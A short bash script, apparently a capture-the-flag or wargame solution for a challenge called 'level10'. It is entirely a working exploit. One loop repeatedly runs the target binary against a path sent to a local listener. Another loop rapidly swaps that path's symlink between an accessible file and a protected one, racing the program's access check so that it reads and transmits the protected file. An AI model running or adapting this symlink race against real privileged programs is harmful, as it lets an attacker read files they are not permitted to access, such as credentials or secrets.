#! /bin/bash

function attempLoop()
{
    while [ true ]
    do
        sleep 1 && ./level10 dodo2 127.0.0.1

    done
}

function changingLoop()
{
    while [ true ]
    do
        rm dodo2 && ln -s myfile dodo2
        rm dodo2 && ln -s dodo dodo2
    done
}

attemp=1000;
while [ $attemp -ge 0 ]
do
    attempLoop & changingLoop 
    attemp=$(( $attemp - 1 ))
done